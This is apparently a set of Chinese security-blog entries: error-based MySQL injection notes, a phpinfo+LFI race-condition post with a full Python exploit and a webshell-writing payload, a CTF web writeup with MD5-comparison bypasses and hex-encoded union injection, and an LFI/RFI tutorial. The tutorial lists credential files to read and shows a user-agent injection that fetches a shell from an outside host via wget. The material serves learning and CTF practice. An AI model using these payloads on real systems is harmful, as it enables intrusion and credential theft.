<h3 id="报错利用-3"><a href="#报错利用-3" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>)a)b))</div></pre></td></tr></table></figure>
<p>注意<code>limit 1</code></p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1k3s6oj30db06cjrj.jpg" alt="10.jpg"></p>
<h2 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h2><p><strong>polygon()</strong>:与上类似建立一个空间多边形数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SET</span> @poly =</div><div class="line">       <span class="string">'Polygon((0 0,0 3,3 0,0 0),(1 1,1 2,2 1,1 1))'</span>;</div></pre></td></tr></table></figure></p>
<h3 id="报错利用-4"><a href="#报错利用-4" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">#读取其他与上相同</div></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n1tfbq1j30db06cglr.jpg" alt="11.png"></p>
<h2 id="multipoint-multilinestring-multipolygon-linestring"><a href="#multipoint-multilinestring-multipolygon-linestring" class="headerlink" title="multipoint() multilinestring() multipolygon() linestring()"></a>multipoint() multilinestring() multipolygon() linestring()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">multipoint():点元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">multilinestring():线元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">multipolygon():多边形集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">linestring():线串</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p><strong>exp()</strong>:返回e(自然对数的底)到X次方的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">multipoint():点元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</div></pre></td></tr></table></figure></p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1xktazj30dc05vglq.jpg" alt="12.png"></p>
<h2 id="Mysql-5-7-以后"><a href="#Mysql-5-7-以后" class="headerlink" title="Mysql 5.7 以后"></a>Mysql 5.7 以后</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ST_LatFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_LatFromGeoHash(<span class="keyword">version</span>());</div><div class="line">ST_LongFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_LongFromGeoHash(<span class="keyword">version</span>());</div><div class="line">GTID_SUBSET()</div><div class="line">    <span class="keyword">select</span> GTID_SUBSET(<span class="keyword">version</span>(),<span class="number">1</span>);</div><div class="line">GTID_SUBTRACT()</div><div class="line">    <span class="keyword">select</span> <span class="keyword">GTID_SUBTRACT</span>(<span class="keyword">version</span>(),<span class="number">1</span>);</div><div class="line">ST_PointFromGeoHash()</div><div class="line">    <span class="keyword">select</span> ST_PointFromGeoHash(<span class="keyword">version</span>(),<span class="number">1</span>);</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-基于phpinfo的包含临时文件]]></title>
      <url>/2018/04/03/web-phpinfo%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— phpinfo+LFI —<br><a id="more"></a></p>
<h2 id="基于phpinfo的包含临时文件"><a href="#基于phpinfo的包含临时文件" class="headerlink" title="基于phpinfo的包含临时文件"></a>基于phpinfo的包含临时文件</h2><p>从N1CTF ezphp 的非预期解中知道的漏洞<br>开始找资料学习</p>
<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
<li>LFI文件包含漏洞</li>
<li>一个服务端的phpinfo页面</li>
</ul>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>先了解文件上传流程</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg" alt="10.png"></p>
<p>向服务器上任意php文件以<code>multipart/form-data</code>方式提交请求上传数据时，会生成临时文件,也就是说不需要一定有显性的上传功能也可以上传生成临时文件。</p>
<p>下面向我们有的phpinfo页面以multipart/form-data方式提交文件</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg" alt="1.png"></p>
<blockquote>
<p>要注意的是 在multipart/form-data方式中，作为分割用的boundary字符串比定义处前面多两个<code>--</code></p>
</blockquote>
<p>查看结果，会有在通常GET请求中没看见的参数<code>$_FILES</code></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg" alt="2.png"></p>
<blockquote>
<p>phpinfo中的 upload_tmp_dir 可以查看临时文件存放的文件夹，但是文件名是随机的，所以不能利用<br>如果 php.ini 没有设置 upload_tmp_dir，那么默认 php 进程会读写系统的临时目录<br>(Windows 默认为 C:/windows/temp，Linux 为 /tmp）<br>另外$_FILES 是在运行中作为环境参数产生的，所以在我们平常中访问的phpinfo()不会包含$_FILES</p>
</blockquote>
<p>接下来通过<code>phpinfo</code>中的<code>$_FILES</code>来获取临时文件的路径以及名称<br>假如上传的临时文件是木马文件，在被删除之前的极短时间之内,需要与服务器竞争时间包含木马文件，当然包含木马文件得到webshell不太现实，可以让木马文件重新生成一个shell文件或者提供一个反弹shell。</p>
<h3 id="脚本竞争包含上传的木马文件"><a href="#脚本竞争包含上传的木马文件" class="headerlink" title="脚本竞争包含上传的木马文件"></a>脚本竞争包含上传的木马文件</h3><p>根据以下原理，来构建脚本</p>
<ul>
<li>通过分块传输编码，提前获知临时文件名称；<br>分块传输可以实现在未完全传输完成时即可获知临时文件名，可以尽早发起文件包含请求，赶在删除之前执行代码。</li>
<li>通过增加临时文件名后数据长度来延长时间；<br>通过观察PHPinfo的信息，在$_FILES信息下面，还有请求头的相关信息，我们可以在请求的时候，通过填充大量无用数据，来增加后面数据的长度，从而增加脚本的处理时间，为包含文件争取更多的时间。</li>
<li>通过大量请求来延迟PHP脚本的执行速度。<br>通过大量的并发请求，提高成功的概率。</li>
</ul>
<p>本机虚拟机测试，无限失败，原因不明<br>自己写的脚本与他人成功的脚本都尝试过，无果，可能跟虚拟机环境有关系<br>贴出他人成功的脚本</p>
<blockquote>
<p>PS.写脚本时，发现python多线程时，不好在线程外读文件，在多个线程内使用这个文件，没有找到官方解释，可能是内存变动的原因</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit</span></div><div class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></div><div class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></div><div class="line"></div><div class="line"><span class="comment">## shell.txt payload content</span></div><div class="line"><span class="comment"># &lt;?php $c=fopen('shell.php','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=<span class="number">100</span></div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">checkHash</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.queue=queue</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		i=<span class="number">0</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			self.clear=self.queue.get()</div><div class="line">			passtry = self.clear</div><div class="line">			<span class="keyword">if</span> passtry != <span class="string">""</span>:</div><div class="line"></div><div class="line">				padding=<span class="string">"A"</span> * <span class="number">8000</span></div><div class="line"></div><div class="line">				cookies = &#123;</div><div class="line">				    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</div><div class="line">				    <span class="string">'othercookie'</span>: padding</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				headers = &#123;</div><div class="line">				    <span class="string">'User-Agent'</span>: padding,</div><div class="line">				    <span class="string">'Pragma'</span>: padding,</div><div class="line">				    <span class="string">'Accept'</span>: padding,</div><div class="line">				    <span class="string">'Accept-Language'</span>: padding,</div><div class="line">				    <span class="string">'DNT'</span>: <span class="string">'1'</span></div><div class="line">				&#125;</div><div class="line"></div><div class="line">				files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'shell.txt'</span>,<span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line">				reqs=<span class="string">'http://192.168.1.23/phpinfo.php?a='</span>+padding</div><div class="line">				<span class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></div><div class="line">				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				data = re.search(<span class="string">r"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">				reqs = <span class="string">'http://192.168.1.23/lfi.php?action=../..'</span>+data</div><div class="line">				<span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></div><div class="line">				<span class="keyword">print</span> reqs</div><div class="line">				response = requests.get(reqs, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">			i+=<span class="number">1</span></div><div class="line">			self.queue.task_done()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(<span class="keyword">True</span>)</div><div class="line">    t.start()</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999</span>):</div><div class="line">	x=str(x)</div><div class="line">	queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure>
<blockquote>
<p>参考<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a><br><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a><br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/79830.html</a></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-网强杯-WEB-writeup]]></title>
      <url>/2018/03/26/WEB-%E7%BD%91%E5%BC%BA%E6%9D%AF%20WEB%20writeup/</url>
      <content type="html"><![CDATA[<p>— 第二届网强杯 —<br><a id="more"></a></p>
<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>可以叫做<strong>md5 Three hit</strong><br>右键源码</p>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) == md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
<p><code>==</code> php特性：可以不完全相等，0e123=0e456<br>param1=QNKCDZO  param2=s878926199a</p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
<p><code>===</code> 精准匹配。<br>利用<code>md5()</code>漏洞，数组传入返回null，使 null===null<br>param1[]=1  param2[]=2</p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
<p>无论输入什么都会变成字符串。没法绕过。<br>利用<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="external">hash碰撞</a>生成2进制文件,使用burpsuite或者python-requests读取文件发送<br>burpsuite就不细说了，python脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">fp1=open(<span class="string">"msg1.bin"</span>)</div><div class="line">fp2=open(<span class="string">"msg2.bin"</span>)</div><div class="line">url=<span class="string">"http://39.107.33.96:10000/"</span></div><div class="line">data=&#123;<span class="string">'param1'</span>:fp1.read(),<span class="string">'param2'</span>:fp2.read()&#125;</div><div class="line">cookie=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'0n7qa29j2kvas7n402idu87aj1'</span>&#125;</div><div class="line">r=requests.post(url,data=data,cookies=cookie)</div><div class="line"><span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
<h2 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h2><p>开始<code>index.php</code>页面，有登录(?func=login)和注册(?func=register)两个功能</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97quaj4j30ez0ckaa7.jpg" alt="111.png"><br></div>

<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97uxoc7j30d30gfaa4.jpg" alt="222.png"><br></div>

<p>输入有过滤</p>
<ul>
<li>账号需要是 0-9a-zA-Z</li>
<li>年龄需要是数字</li>
<li>密码没有过滤</li>
</ul>
<p>注册后登录，进入 <code>profile.php</code></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97zr4w8j30k3085whd.jpg" alt="333.png"><br></div>

<p>跑目录，找到一个<strong>config.php</strong>，但没有内容<br>抓包查看，其中login页面有回显，估计是数据库查询内容回显，其他页面正常<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq983ffhtj30b508eweo.jpg" alt="444.png"><br>思索…..</p>
<ul>
<li>php中判断是数字可能用到<code>is_numeric()</code>，is_numeric判断数字不严格，可以是16进制。</li>
<li>猜测后端数据库语句是<br><code>insert into lesson1(name,age,password) values(name,age,password)</code><br>在insert语句中，16进制插入会解析成字符，存入数据库中</li>
</ul>
<p>以上两点结合在一起<br>可以通过age输入payload转成16进制，通过insert注入数据库中，再通过login的回显判断是否成功<br>再通过页面逻辑，判断<code>profile.php</code>中的数据库语句是<br><code>select * from 表 where age = (我们的age)</code></p>
<p>构造payload测试(因为回显判断4列)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">age=1 and 0 union select 1,2,3,4 #</div><div class="line">age=0x3120616e64203020756e696f6e2073656c65637420312c322c332c342023</div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpq987soqwj30bg08e3yr.jpg" alt="555.png"><br></div>

<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpq98az6sij30l50b8q7t.jpg" alt="666.png"><br></div>

<p>成功<br>之后省略注入过程<br>得到<strong>user()</strong>,<strong>database()</strong>,尝试<strong>information_schema</strong>可行，得到表结构</p>
<table>
<thead>
<tr>
<th style="text-align:center">库</th>
<th style="text-align:center">表</th>
<th style="text-align:center">列</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">qwb</td>
<td style="text-align:center">users</td>
<td style="text-align:center">id username age password</td>
</tr>
<tr>
<td style="text-align:center">qwb</td>
<td style="text-align:center">flag</td>
<td style="text-align:center">flag</td>
</tr>
</tbody>
</table>
<p>读取flag</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-LFI与RFI利用]]></title>
      <url>/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记(长篇) —<br>— 本地文件包含&amp;远程文件包含 —<br>— PHP伪协议利用&amp;文件上传漏洞 —<br><a id="more"></a><br>emmm，从最开始的定义开始吧。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可。<br>文件包含分为 </p>
<ul>
<li><code>本地文件包含</code> (local file include)： 包含服务器本地文件</li>
<li><code>远程文件包含</code> (remote file include)： 包含远程服务器的文件，远程文件包含要求更加苛刻，需要php_ini开启url_allow_fopen 和 url_allow_include(具体情况下面说明)</li>
</ul>
<p><strong>文件包含PHP函数</strong>：</p>
<ul>
<li>include()：</li>
<li>include_once()：先验证是否已经包含了文件，如果已经包含了，就不再执行</li>
<li>require()：</li>
<li>require_once()：先验证是否已经包含了文件，如果已经包含了，就不再执行</li>
</ul>
<p>include()，include_once()：包含文件时即使遇到错误，下面代码会依然执行<br>require()，require_once()：包含文件时遇到错误，直接报错退出程序</p>
<p>此类漏洞的原理就是include的内容中有我们可控的变量，从而达成我们包含执行我们想要的文件<br>其造成的危害，从文件泄露，到getshell都有<br>下面我们分开细说<strong>LFI</strong>和<strong>RFI</strong></p>
<h2 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h2><p><strong>本地文件包含</strong>是指只能包含本机文件的文件包含漏洞，大多出现在模块加载、模板加载和cache调用这些地方，有多重利用方式。<br>先来看一个例子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action=$_GET[<span class="string">'action'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">"./$action.php"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>以下拼接的利用方式就是最常规的利用方法</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpyci6sw4aj30c903uq2y.jpg" alt="1.png"><br></div>

<p>再介绍更多的利用方法</p>
<h3 id="本地目录遍历"><a href="#本地目录遍历" class="headerlink" title="本地目录遍历"></a>本地目录遍历</h3><p>利用<code>../</code>来向上级遍历目录从而一层一层地访问所有文件（有权限的话）<br>打开mysql.php</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycif4rqmj30fx04idfu.jpg" alt="2.png"><br></div>

<p>成功</p>
<p>linux下的一些关键文件：</p>
<ul>
<li>../../../../../../../etc/passwd(操作系统用户信息,该文件为所有用户可见)</li>
<li>../../../../../proc/self/environ(proc目录)</li>
<li>../../../../../../var/log/apache2/access.log(apache日志，需要包括所有上级目录访问权限)</li>
<li>还有其他配置文件(Web服务器配置文件,Web日志)</li>
</ul>
<p>还有其他</p>
<pre><code>ssh免密码登录的秘钥文件等
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/known_hosts
加密后的用户口令位置
/etc/shadow
历史命令
/root/.bash_history
/root/.mysql_history
进程文件
/proc/self/fd/fd[0-9]* (文件标识符)
检查已经被系统挂载的设备
/proc/mounts
机器的内核配置文件
/proc/config.gz
window下
C:/boot.ini  //查看系统版本
  C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件
  C:/Windows/repairsam  //存储系统初次安装的密码
  C:/Program Files/mysqlmy.ini  //Mysql配置
  C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root
  C:/Windows/php.ini  //php配置信息
  C:/Windows/my.ini  //Mysql配置信息
</code></pre><p>再能读取一些文件的基础上有更多利用方式</p>
<h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="/proc/self/environ"></a>/proc/self/environ</h3><p><a href="https://blog.csdn.net/zdwzzu2006/article/details/7747977" target="_blank" rel="external">/proc文件系统</a>：是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。<br><strong>/proc/self/environ</strong>:当前正在运行的进程的环境变量列表</p>
<p>linux环境下建立lfi.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>($_GET[<span class="string">'$file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问，查看/proc/self/environ</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycio976rj3100083wg8.jpg" alt="3.png"><br></div>

<p>如图可以看到包含了HTTP头的信息<br>尝试改变他们</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycitkdcij30ie04b3yo.jpg" alt="4.png"><br></div>

<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpyciyyzj1j30jh048jrm.jpg" alt="5.png"><br></div>

<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycj30ko4j311t082gnh.jpg" alt="6.png"><br></div>

<p>改变成功，也就是说我们可以通过HTTP头控制/proc/self/environ文件</p>
<h4 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h4><p>发现我们可以控制这些值后，如果写入php代码会直接执行，这个地方就形成了<strong>命令注入执行</strong><br>我们选取user-agent变量向其中插入反弹shell木马</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycj9e23ij30s5051dga.jpg" alt="7.png"><br></div>

<p>连接shell</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycjk3qffj30ap023q30.jpg" alt="8.png"><br></div>

<p>成功</p>
<p>通过其他参数注入也是可以的<br>还可以选取<code>&lt;?system(&#39;wget http://aaa.com/Shells/shell.txt -O shell.php&#39;);?&gt;</code>来下载文件到对方服务器，直接访问木马文件等。</p>
<blockquote>
<p>这个地方选取木马不能选取类似于<code>eval($_GET[&#39;cmd&#39;];</code>的webshell<br>因为形成的语句会变为<code>include(../../../proc/self/environ?cmd=&#39;ls&#39;)</code><br>会提示找不到该文件，从而无法包含文件</p>
</blockquote>
<h3 id="日志文件污染"><a href="#日志文件污染" class="headerlink" title="日志文件污染"></a>日志文件污染</h3><p><strong>日志文件污染</strong>是通过将注入目标系统的代码写入到日志文件中。<br>通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。</p>
<ul>
<li>找到日志文件，并且有访问和执行权限（包括所有上级目录访问和执行权限）</li>
<li>nc提交木马至对方端口，会被写入对方的日志文件</li>
<li>包含日志文件执行代码</li>
</ul>
<blockquote>
<p>一般日志文件位置<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log<br>/var/log/apache2/access.log</p>
</blockquote>
<h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>1.前提有权访问 access.log  /var/log/apache2/access.log （包括所有上级目录访问权限）<br>2.nc提交至对方端口</p>
<blockquote>
